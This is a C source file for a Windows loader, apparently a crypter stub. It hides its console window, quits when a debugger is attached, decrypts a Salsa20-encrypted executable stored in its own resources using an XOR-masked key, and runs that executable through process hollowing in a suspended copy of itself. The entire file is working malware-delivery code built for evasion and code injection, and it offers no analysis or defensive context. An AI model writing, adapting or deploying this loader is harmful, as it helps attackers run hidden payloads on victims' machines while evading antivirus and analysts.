#include <stdio.h>
#include <stdint.h>
#include <windows.h>
#include "salsa20.h"
#include "SHA1.h"

// Function to extract embedded resource from this executable
unsigned char *GetResource(int resourceId, char* resourceType, unsigned long* dwSize)
{
    HGLOBAL hResData;
    HRSRC   hResInfo;
    unsigned char* pvRes;
    HMODULE hModule = GetModuleHandle(NULL);

    if (((hResInfo = FindResource(hModule, MAKEINTRESOURCE(resourceId), resourceType)) != NULL) &&
        ((hResData = LoadResource(hModule, hResInfo)) != NULL) &&
        ((pvRes = (unsigned char *)LockResource(hResData)) != NULL))
    {
        *dwSize = SizeofResource(hModule, hResInfo);
        return pvRes;
    }
    
    // if resource not found
    *dwSize = 0;
    return NULL;
}

int main()
{
    ShowWindow(GetConsoleWindow(), SW_HIDE);

    if (IsDebuggerPresent())
    {
        OutputDebugStringA("Oops! Unexpected failure.");
        return 1;
    }

    // stub
    unsigned char key[32] = {0}; 
    unsigned char nonce[8] = {0}; 

    // Extract the encrypted PE from our resources
    unsigned long payloadSize, keySize, nonceSize;
    unsigned char* payloadResPtr = GetResource(132, RT_RCDATA, &payloadSize);
    unsigned char* hashedKeyResPtr = GetResource(133, RT_RCDATA, &keySize);
    unsigned char* hashedNonceResPtr = GetResource(134, RT_RCDATA, &nonceSize);

    if ((payloadResPtr == NULL || payloadSize == 0) || 
       (hashedKeyResPtr == NULL || keySize == 0) || 
       (hashedNonceResPtr == NULL || nonceSize == 0))
    {
        // No payload/key/nonce found
        return 1;
    }

    uint32_t counter = 0;
    
    // Calculating hash of payload. If it was changed then decryption will be wrong.
    unsigned char *data = (unsigned char*)payloadResPtr;
    unsigned char hash[SHA1_BLOCK_SIZE];
    SHA1(data, payloadSize, hash);

    unsigned long state = (unsigned long)hash[0] 
    | ((unsigned long)hash[1] << 8) 
    | ((unsigned long)hash[2] << 16) 
    | ((unsigned long)hash[3] << 24);

    // Generate LCG value
    unsigned long LCG_Result = lcg_rand(&state);

    // Deobfuscation
    for (int i = 0; i < 32; i++)
        key[i] = hashedKeyResPtr[i] ^ ((LCG_Result >> ((i % 4) * 8)) & 0xFF);
    for (int i = 0; i < 8; i++)
        nonce[i] = hashedNonceResPtr[i] ^ ((LCG_Result >> ((i % 4) * 8)) & 0xFF);


    // Allocate memory for decrypted PE
    uint8_t* decrypted = (uint8_t*)VirtualAlloc(NULL, payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (decrypted == NULL)
    {
        return 1;
    }

    // Copy encrypted data and decrypt it in place
    memcpy(decrypted, payloadResPtr, payloadSize);
    salsa20_crypt(decrypted, (uint32_t)payloadSize, key, nonce, counter);

    // Obfuscation
    for (int i = 0; i < 32; i++)
        key[i] ^= ((LCG_Result >> ((i % 4) * 8)) & 0xFF);
    for (int i = 0; i < 8; i++)
        nonce[i] ^= ((LCG_Result >> ((i % 4) * 8)) & 0xFF);
        
    // Perform process hollowing to execute the decrypted PE
    void* pe = decrypted;

    IMAGE_DOS_HEADER* DOSHeader;
    IMAGE_NT_HEADERS64* NtHeader;
    IMAGE_SECTION_HEADER* SectionHeader;

    PROCESS_INFORMATION PI;
    STARTUPINFOA SI;

    void* pImageBase;
    char currentFilePath[MAX_PATH];

    // Parse PE headers
    DOSHeader = (PIMAGE_DOS_HEADER)pe;
    NtHeader = (PIMAGE_NT_HEADERS64)((uint8_t*)pe + DOSHeader->e_lfanew);

    // Verify this is a valid PE file
    if (NtHeader->Signature == IMAGE_NT_SIGNATURE)
    {
        ZeroMemory(&PI, sizeof(PI));
        ZeroMemory(&SI, sizeof(SI));

        // Get path to current executable (ourselves)
        GetModuleFileNameA(NULL, currentFilePath, MAX_PATH);

        // Create a suspended process using our own executable as host
        if (CreateProcessA(currentFilePath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &SI, &PI))
        {

            // Allocate memory for thread context
            CONTEXT* CTX = (CONTEXT*)VirtualAlloc(NULL, sizeof(CONTEXT), MEM_COMMIT, PAGE_READWRITE);
            if (CTX == NULL)
            {
                TerminateProcess(PI.hProcess, 1);
                VirtualFree(decrypted, 0, MEM_RELEASE);
                return 1;
            }
            
            CTX->ContextFlags = CONTEXT_FULL;

            // Get the thread context of the suspended process
            if (GetThreadContext(PI.hThread, CTX))
            {

                // Allocate memory in target process for our PE
                pImageBase = VirtualAllocEx
                (
                        PI.hProcess,
                        (LPVOID)(NtHeader->OptionalHeader.ImageBase),
                        NtHeader->OptionalHeader.SizeOfImage,
                        MEM_COMMIT | MEM_RESERVE,
                        PAGE_EXECUTE_READWRITE
                );

                if (pImageBase != NULL)
                {
                    // Write PE headers to target process
                    WriteProcessMemory(PI.hProcess, pImageBase, pe, NtHeader->OptionalHeader.SizeOfHeaders, NULL);

                    // Write each section of the PE to target process
                    for (size_t i = 0; i < NtHeader->FileHeader.NumberOfSections; i++)
                    {
                        SectionHeader = (PIMAGE_SECTION_HEADER)(
                            (uint8_t*)pe + DOSHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS64) + (i * sizeof(IMAGE_SECTION_HEADER))
                        );

                        WriteProcessMemory
                        (
                                PI.hProcess,
                                (LPVOID)((uintptr_t)pImageBase + SectionHeader->VirtualAddress),
                                (LPVOID)((uintptr_t)pe + SectionHeader->PointerToRawData),
                                SectionHeader->SizeOfRawData,
                                NULL
                        );
                    }

                    // Update the image base in the target process PEB
                    WriteProcessMemory
                    (
                            PI.hProcess,
                            (LPVOID)(CTX->Rdx + 0x10),
                            &NtHeader->OptionalHeader.ImageBase,
                            sizeof(uint64_t),
                            NULL
                    );

                    // Set the entry point to our PE's entry point
                    CTX->Rcx = (uintptr_t)pImageBase + NtHeader->OptionalHeader.AddressOfEntryPoint;
                    SetThreadContext(PI.hThread, CTX);
                    
                    // Resume execution - this will start our injected PE
                    ResumeThread(PI.hThread);

                    // Wait for the injected process to complete
                    WaitForSingleObject(PI.hProcess, INFINITE);
                    
                    // Cleanup
                    VirtualFree(CTX, 0, MEM_RELEASE);
                    VirtualFree(decrypted, 0, MEM_RELEASE);
                    return 0;
                }
            }

            // If we get here, something went wrong - cleanup and terminate
            TerminateProcess(PI.hProcess, 1);
            VirtualFree(CTX, 0, MEM_RELEASE);
        }
    }

    // Cleanup on failure
    VirtualFree(decrypted, 0, MEM_RELEASE);
    return 1;
}